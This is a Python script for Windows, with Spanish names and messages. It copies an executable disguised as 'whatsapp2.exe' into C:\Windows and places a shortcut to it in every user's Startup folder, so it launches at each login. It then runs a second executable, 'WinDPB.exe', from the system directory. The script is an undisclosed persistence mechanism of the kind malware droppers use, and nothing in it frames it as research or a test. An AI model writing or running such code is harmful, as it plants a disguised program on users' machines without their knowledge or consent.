import os
import shutil
import win32com.client
import subprocess
import sys

def verificar_sistema_operativo():
    if os.name == "nt":
        print("El sistema operativo es Windows.")
        listar_startup_usuarios_windows()
    else:
        print("El sistema operativo no es Windows.")

def listar_startup_usuarios_windows():
    ruta_usuarios = "C:\\Users"
    usuarios_a_ignorar = {
        "All Users",
        "Default",
        "Default User",
        "defaultuser1",
        "Public"
    }

    try:
        nombres_usuarios = [nombre for nombre in os.listdir(ruta_usuarios)
                            if os.path.isdir(os.path.join(ruta_usuarios, nombre)) and nombre not in usuarios_a_ignorar]

        for usuario in nombres_usuarios:
            ruta_startup = os.path.join(ruta_usuarios, usuario, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            
            if os.path.exists(ruta_startup):
                print(f"Contenido de {ruta_startup}:")
                contenido_startup = os.listdir(ruta_startup)
                
                ruta = r"C:\Windows"
                archivo = "whatsapp2.exe"
                
                copiar_archivo_a_ruta(ruta, archivo, ruta_startup)
                
                if contenido_startup:
                    for elemento in contenido_startup:
                        print(f"  {elemento}")
                else:
                    print("  La carpeta está vacía.")
            else:
                print(f"La carpeta {ruta_startup} no existe.")
    except Exception as e:
        print(f"Ocurrió un error al listar los usuarios: {e}")

def copiar_archivo_a_ruta(destino, nombre_archivo, ruta_acceso_directo):
    ruta_origen = os.path.join(os.path.dirname(sys.executable), nombre_archivo)
    
    if not os.path.exists(ruta_origen):
        print(f"El archivo {nombre_archivo} no existe en la carpeta del script.")
        return

    ruta_destino = os.path.join(destino, nombre_archivo)
    
    try:
        shutil.copy(ruta_origen, ruta_destino)
        print(f"Archivo {nombre_archivo} copiado a {destino} exitosamente.")
        
        crear_acceso_directo(ruta_destino, ruta_acceso_directo, nombre_archivo)
        print(f"Acceso directo de {nombre_archivo} creado en {ruta_acceso_directo} exitosamente.")
    except Exception as e:
        print(f"Ocurrió un error al copiar el archivo: {e}")

def crear_acceso_directo(ruta_destino, ruta_acceso_directo, nombre_archivo):
    if not os.path.exists(ruta_acceso_directo):
        try:
            os.makedirs(ruta_acceso_directo)
            print(f"Carpeta {ruta_acceso_directo} creada exitosamente.")
        except Exception as e:
            print(f"Ocurrió un error al crear la carpeta {ruta_acceso_directo}: {e}")
            return

    shell = win32com.client.Dispatch("WScript.Shell")
    ruta_acceso_directo_completa = os.path.join(ruta_acceso_directo, f"{os.path.splitext(nombre_archivo)[0]}.lnk")
    acceso_directo = shell.CreateShortCut(ruta_acceso_directo_completa)
    acceso_directo.Targetpath = ruta_destino
    acceso_directo.WorkingDirectory = os.path.dirname(ruta_destino)
    acceso_directo.save()

def ejecutar_exe(ruta_exe):
    if not os.path.exists(ruta_exe):
        print(f"El archivo {ruta_exe} no existe.")
        return

    try:
        subprocess.run([ruta_exe], check=True)
        print(f"El archivo {ruta_exe} se ejecutó correctamente.")
    except subprocess.CalledProcessError as e:
        print(f"Ocurrió un error al ejecutar el archivo: {e}")

if __name__ == "__main__":
    verificar_sistema_operativo()
    ruta = r"C:\Windows\WinDPB.exe"
    ejecutar_exe(ruta)
    input("a")